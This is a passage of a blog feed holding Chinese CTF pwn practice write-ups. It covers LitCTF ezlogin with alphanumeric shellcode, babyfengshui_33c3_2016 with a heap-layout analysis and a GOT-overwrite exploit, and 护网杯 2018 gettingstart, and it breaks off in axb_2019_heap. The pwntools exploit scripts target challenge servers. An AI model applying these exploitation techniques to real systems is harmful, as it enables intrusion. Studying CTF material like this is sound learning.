class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># libc=ELF(&#x27;./libc-2.23.so&#x27;)</span></span><br><span class="line">path=<span class="string">&#x27;./login2&#x27;</span></span><br><span class="line">elf=ELF(path)</span><br><span class="line"></span><br><span class="line">amd64shell=<span class="string">b&quot;RRYh00AAX1A0hA004X1A4hA00AX1A8QX44Pj0X40PZPjAX4znoNDnRYZnCXAA&quot;</span></span><br><span class="line"></span><br><span class="line">r   =<span class="keyword">lambda</span> num=<span class="number">4096</span>:p.recv(num)</span><br><span class="line">ru  =<span class="keyword">lambda</span> content,drop=<span class="literal">False</span>:p.recvuntil(content,drop)</span><br><span class="line">rl  =<span class="keyword">lambda</span> :p.recvline()</span><br><span class="line">sla =<span class="keyword">lambda</span> flag,content:p.sendlineafter(flag,content)</span><br><span class="line">sa  =<span class="keyword">lambda</span> flag,content:p.sendafter(flag,content)</span><br><span class="line">sl  =<span class="keyword">lambda</span> content:p.sendline(content)</span><br><span class="line">s   =<span class="keyword">lambda</span> content:p.send(content)</span><br><span class="line">irt =<span class="keyword">lambda</span> :p.interactive()</span><br><span class="line">tbs =<span class="keyword">lambda</span> content:<span class="built_in">str</span>(content).encode()</span><br><span class="line">leak=<span class="keyword">lambda</span> name,addr :info(<span class="string">f&#x27;<span class="subst">&#123;name&#125;</span>====&gt;<span class="subst">&#123;<span class="built_in">hex</span>(addr)&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">local=<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">run</span>():</span><br><span class="line">    <span class="keyword">if</span> local:</span><br><span class="line">        <span class="keyword">return</span> process(path)</span><br><span class="line">    <span class="keyword">return</span> remote(<span class="string">&#x27;node4.anna.nssctf.cn&#x27;</span>,<span class="number">28735</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>(<span class="params">duan=<span class="number">0</span></span>):</span><br><span class="line">    <span class="keyword">if</span> local:</span><br><span class="line">        <span class="keyword">if</span> duan:</span><br><span class="line">            gdb.attach(p,duan)</span><br><span class="line">            pause()</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        gdb.attach(p)</span><br><span class="line">        pause()</span><br><span class="line"></span><br><span class="line">p=run()</span><br><span class="line"></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;msg:ro0tt\nopt:1\n&#x27;</span></span><br><span class="line"></span><br><span class="line">ru(<span class="string">b&#x27;&gt;&gt;&gt; &#x27;</span>)</span><br><span class="line">sl(payload)</span><br><span class="line"><span class="comment">#shellcode=asm(shellcraft.sh())</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;opt:2\nmsg:&#x27;</span>+amd64shell+<span class="string">b&#x27;\n&#x27;</span></span><br><span class="line">ru(<span class="string">b&#x27;&gt;&gt;&gt; &#x27;</span>)</span><br><span class="line">sl(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;刷题记录2&quot;&gt;&lt;a href=&quot;#刷题记录2&quot; class=&quot;headerlink&quot; title=&quot;刷题记录2&quot;&gt;&lt;/a&gt;刷题记录2&lt;/h1&gt;&lt;h1 id=&quot;LitCTF-2023-ezlogin&quot;&gt;&lt;a href=&quot;#LitCTF-2023-ezlogin&quot; c</summary>
      
    
    
    
    <category term="做题记录" scheme="http://s1nec-1o.github.io/categories/%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
    
    
    <category term="traditional pwn" scheme="http://s1nec-1o.github.io/tags/traditional-pwn/"/>
    
  </entry>
  
  <entry>
    <title>题录1.0</title>
    <link href="http://s1nec-1o.github.io/2024/05/12/%E9%A2%98%E5%BD%951-0/"/>
    <id>http://s1nec-1o.github.io/2024/05/12/%E9%A2%98%E5%BD%951-0/</id>
    <published>2024-05-12T08:48:29.000Z</published>
    <updated>2024-05-12T08:53:49.290Z</updated>
    
    <content type="html"><![CDATA[<h1 id="刷题记录1"><a href="#刷题记录1" class="headerlink" title="刷题记录1"></a>刷题记录1</h1><p>因为国赛将近，开始每天几道题，难度不等，之后会有patch的使用（算是预告和DIR-815的复现（早就复现一直没时间详细写</p><h1 id="babyfengshui-33c3-2016"><a href="#babyfengshui-33c3-2016" class="headerlink" title="babyfengshui_33c3_2016"></a>babyfengshui_33c3_2016</h1><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202405121653175.png" alt="image-20240507223850443"></p><p>是一道风水题，可以拿来找回感觉</p><h2 id="静态分析"><a href="#静态分析" class="headerlink" title="静态分析"></a>静态分析</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __cdecl __noreturn <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> v0; <span class="comment">// [esp+3h] [ebp-15h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// [esp+4h] [ebp-14h] BYREF</span></span><br><span class="line">  <span class="type">size_t</span> v2[<span class="number">4</span>]; <span class="comment">// [esp+8h] [ebp-10h] BYREF</span></span><br><span class="line"></span><br><span class="line">  v2[<span class="number">1</span>] = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  alarm(<span class="number">0x14</span>u);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;0: Add a user&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;1: Delete a user&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;2: Display a user&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;3: Update a user description&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;4: Exit&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Action: &quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v1) == <span class="number">-1</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> ( !v1 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;size of description: &quot;</span>);</span><br><span class="line">      __isoc99_scanf(<span class="string">&quot;%u%c&quot;</span>, v2, &amp;v0);</span><br><span class="line">      add(v2[<span class="number">0</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v1 == <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;index: &quot;</span>);</span><br><span class="line">      __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, v2);</span><br><span class="line">      delete(LOBYTE(v2[<span class="number">0</span>]));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v1 == <span class="number">2</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;index: &quot;</span>);</span><br><span class="line">      __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, v2);</span><br><span class="line">      show(v2[<span class="number">0</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v1 == <span class="number">3</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;index: &quot;</span>);</span><br><span class="line">      __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, v2);</span><br><span class="line">      edit(v2[<span class="number">0</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v1 == <span class="number">4</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Bye&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="type">unsigned</span> __int8)byte_804B069 &gt; <span class="number">0x31</span>u )<span class="comment">// 有限制</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;maximum capacity exceeded, bye&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>是一个很常规的菜单堆</p><p>可以分析出一个结构体</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Node</span>&#123;</span></span><br><span class="line">    <span class="type">char</span>* description;</span><br><span class="line">    <span class="type">char</span> name[<span class="number">0x7f</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>他是首先会malloc一个堆作为存储des，然后再malloc 0x80来存储name和des堆的地址</p><p>主要的漏洞点在于edit函数中</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">int</span> __cdecl <span class="title function_">sub_8048724</span><span class="params">(<span class="type">unsigned</span> __int8 a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> v2; <span class="comment">// [esp+17h] [ebp-11h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// [esp+18h] [ebp-10h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v4; <span class="comment">// [esp+1Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( a1 &lt; (<span class="type">unsigned</span> __int8)byte_804B069 &amp;&amp; *(&amp;ptr + a1) )</span><br><span class="line">  &#123;</span><br><span class="line">    v3 = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;text length: &quot;</span>);</span><br><span class="line">    __isoc99_scanf(<span class="string">&quot;%u%c&quot;</span>, &amp;v3, &amp;v2);</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="type">char</span> *)(v3 + *(_DWORD *)*(&amp;ptr + a1)) &gt;= (<span class="type">char</span> *)*(&amp;ptr + a1) - <span class="number">4</span> )<span class="comment">// 保证des的heap地址小于总heap地址</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;my l33t defenses cannot be fooled, cya!&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;text: &quot;</span>);</span><br><span class="line">    fgets_1(*(<span class="type">char</span> **)*(&amp;ptr + a1), v3 + <span class="number">1</span>);    <span class="comment">// v3可改说明堆溢出，但是要绕过上述的if</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readgsdword(<span class="number">0x14</span>u) ^ v4;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>他的数据判断主要是通过地址的判断</p><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>1.首先申请连续的3个结构体，description部分空间大小为0x80，方便计算：</p><table><thead><tr><th>堆块0 des 0x80</th><th>堆块0 node 0x80</th><th>堆块1 des 0x80</th><th>堆块1 node 0x80</th><th>堆块2 des 0x8</th><th>堆块2 node 0x80</th></tr></thead><tbody><tr><td></td><td></td><td></td><td></td><td></td><td></td></tr></tbody></table><p>2.释放第一个结构体，得到一个空闲的0x100的堆块：</p><table><thead><tr><th>空闲堆块0 x100</th><th>堆块1 des 0x80</th><th>堆块1 node 0x80</th><th>堆块2 des 0x8</th><th>堆块2 node 0x80</th></tr></thead><tbody><tr><td></td><td></td><td></td><td></td><td></td></tr></tbody></table><p>3.申请新的结构体，其description部分为0x100，根据linux堆的性质，会优先分配空闲的堆块，释放得到的空闲堆块可以满足description的空间需求，而node的空间需要新分配，得到下面的结构：</p><table><thead><tr><th align="right">堆块0 des 0x100</th><th>堆块1 des 0x80</th><th>堆块1 node 0x80</th><th>堆块2 des 0x8</th><th>堆块2 node 0x80</th><th>堆块0 node 0x80</th></tr></thead><tbody><tr><td align="right"></td><td></td><td></td><td></td><td></td><td></td></tr></tbody></table><p>之后绕过只需要des的大小输入中间跨过的堆的大小就能实现堆溢出了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">path=<span class="string">&#x27;./babyfengshui_1&#x27;</span></span><br><span class="line">elf=ELF(path)</span><br><span class="line"></span><br><span class="line">r   =<span class="keyword">lambda</span> num=<span class="number">4096</span>:p.recv(num)</span><br><span class="line">ru  =<span class="keyword">lambda</span> content,drop=<span class="literal">False</span>:p.recvuntil(content,drop)</span><br><span class="line">rl  =<span class="keyword">lambda</span> :p.recvline()</span><br><span class="line">sla =<span class="keyword">lambda</span> flag,content:p.sendlineafter(flag,content)</span><br><span class="line">sa  =<span class="keyword">lambda</span> flag,content:p.sendafter(flag,content)</span><br><span class="line">sl  =<span class="keyword">lambda</span> content:p.sendline(content)</span><br><span class="line">s   =<span class="keyword">lambda</span> content:p.send(content)</span><br><span class="line">irt =<span class="keyword">lambda</span> :p.interactive()</span><br><span class="line">tbs =<span class="keyword">lambda</span> content:<span class="built_in">str</span>(content).encode()</span><br><span class="line">leak=<span class="keyword">lambda</span> name,addr :log.success(<span class="string">&#x27;&#123;&#125; = &#123;:#x&#125;&#x27;</span>.<span class="built_in">format</span>(name, addr))</span><br><span class="line"></span><br><span class="line">local=<span class="number">1</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">run</span>():</span><br><span class="line">    <span class="keyword">if</span> local:</span><br><span class="line">        <span class="keyword">return</span> process(path)</span><br><span class="line">    <span class="keyword">return</span> remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="number">28996</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">    <span class="keyword">if</span> local:</span><br><span class="line">        gdb.attach(p)</span><br><span class="line">        pause()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size, length, text=<span class="built_in">bytearray</span></span>):</span><br><span class="line">    sla(<span class="string">&#x27;Action: &#x27;</span>,<span class="string">b&#x27;0&#x27;</span>)</span><br><span class="line">    sla(<span class="string">&#x27;size of description: &#x27;</span>,tbs(size))</span><br><span class="line">    sla(<span class="string">&#x27;name: &#x27;</span>,<span class="string">b&#x27;s1nec-1o&#x27;</span>)</span><br><span class="line">    sla(<span class="string">&#x27;text length: &#x27;</span>,tbs(length))</span><br><span class="line">    sla(<span class="string">&#x27;text: &#x27;</span>,text)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">    sla(<span class="string">&#x27;Action: &#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    sla(<span class="string">&#x27;index: &#x27;</span>,tbs(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    sla(<span class="string">&#x27;Action: &#x27;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    sla(<span class="string">&#x27;index: &#x27;</span>,<span class="built_in">str</span>(idx).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index, length, text</span>):</span><br><span class="line">    sla(<span class="string">&quot;Action: &quot;</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    sla(<span class="string">&quot;index: &quot;</span>,tbs(index))</span><br><span class="line">    sla(<span class="string">&#x27;length: &#x27;</span>,tbs(length))</span><br><span class="line">    sla(<span class="string">&#x27;text: &#x27;</span>,text)</span><br><span class="line"></span><br><span class="line">p=run()</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x80</span>, <span class="number">0x80</span>, <span class="string">b&#x27;s1nec-1o&#x27;</span>)</span><br><span class="line">add(<span class="number">0x80</span>, <span class="number">0x80</span>, <span class="string">b&#x27;s1nec-1o&#x27;</span>)</span><br><span class="line">add(<span class="number">0x8</span>, <span class="number">0x8</span>, <span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0x100</span>, <span class="number">0x19c</span>, <span class="string">b&quot;a&quot;</span>*<span class="number">0x198</span>+p32(elf.got[<span class="string">&#x27;free&#x27;</span>]))</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">ru(<span class="string">&#x27;description: &#x27;</span>)</span><br><span class="line">free_addr=u32(r(<span class="number">4</span>))</span><br><span class="line">info(<span class="string">f&quot;free_addr==&gt;<span class="subst">&#123;<span class="built_in">hex</span>(free_addr)&#125;</span>&quot;</span>)</span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">libc=LibcSearcher(<span class="string">&#x27;free&#x27;</span>,free_addr)</span><br><span class="line">libc_base=free_addr-libc.dump(<span class="string">&#x27;free&#x27;</span>)</span><br><span class="line">sys_addr=libc_base+libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">info(<span class="string">f&quot;system_addr===&gt;<span class="subst">&#123;<span class="built_in">hex</span>(sys_addr)&#125;</span>&quot;</span>)</span><br><span class="line">edit(<span class="number">1</span>,<span class="number">0x4</span>,p32(sys_addr))</span><br><span class="line">debug()</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">irt()</span><br></pre></td></tr></table></figure><p>至少本地通了（汗，远程太old了</p><h1 id="护网杯-2018-gettingstart"><a href="#护网杯-2018-gettingstart" class="headerlink" title="护网杯_2018_gettingstart"></a>护网杯_2018_gettingstart</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 buf[<span class="number">3</span>]; <span class="comment">// [rsp+10h] [rbp-30h] BYREF</span></span><br><span class="line">  __int64 v5; <span class="comment">// [rsp+28h] [rbp-18h]</span></span><br><span class="line">  <span class="type">double</span> v6; <span class="comment">// [rsp+30h] [rbp-10h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v7; <span class="comment">// [rsp+38h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v7 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="keyword">sizeof</span>(buf));</span><br><span class="line">  v5 = <span class="number">0x7FFFFFFFFFFFFFFF</span>LL;</span><br><span class="line">  v6 = <span class="number">1.797693134862316e308</span>;</span><br><span class="line">  setvbuf(_bss_start, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;HuWangBei CTF 2018 will be getting start after %lu seconds...\n&quot;</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;But Whether it starts depends on you.&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x28</span>uLL);</span><br><span class="line">  <span class="keyword">if</span> ( v5 == <span class="number">0x7FFFFFFFFFFFFFFF</span>LL &amp;&amp; v6 == <span class="number">0.1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;HuWangBei CTF 2018 will be getting start after %g seconds...\n&quot;</span>, v6);</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Try again!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>算是一个趣味题，是覆盖v5为7FFF…FFF然后覆盖v6为0.1就可以getshell，主要是v6的double型转换比较复杂（千万不要用gpt做这种工作。。。。。</p><p>浮点型：<a href="https://tooltt.com/floatconverter/">https://tooltt.com/floatconverter/</a></p><p>就有exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">path=<span class="string">&#x27;start&#x27;</span></span><br><span class="line">p=process(path)</span><br><span class="line"></span><br><span class="line">pay=<span class="number">0x18</span>*<span class="string">b&#x27;a&#x27;</span>+p64(<span class="number">0x7FFFFFFFFFFFFFFF</span>)+p64(<span class="number">0x3FB999999999999A</span>) </span><br><span class="line">p.recvuntil(<span class="string">b&#x27;But Whether it starts depends on you.\n&#x27;</span>)</span><br><span class="line">p.sendline(pay)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="axb-2019-heap"><a href="#axb-2019-heap" class="headerlink" title="axb_2019_heap"></a>axb_2019_heap</h1><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202405121653176.png" alt="image-20240508185905256" style="zoom:50%;" /><p>满保护</p><h2 id="静态分析-1"><a href="#静态分析-1" class="headerlink" title="静态分析"></a>静态分析</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl __noreturn <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  init(argc, argv, envp);</span><br><span class="line">  banner();                                     <span class="comment">// 有个格式化字符串漏洞</span></span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    menu();</span><br><span class="line">    v3 = get_int();</span><br><span class="line">    <span class="keyword">switch</span> ( v3 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        add_note();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        delete_note();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span 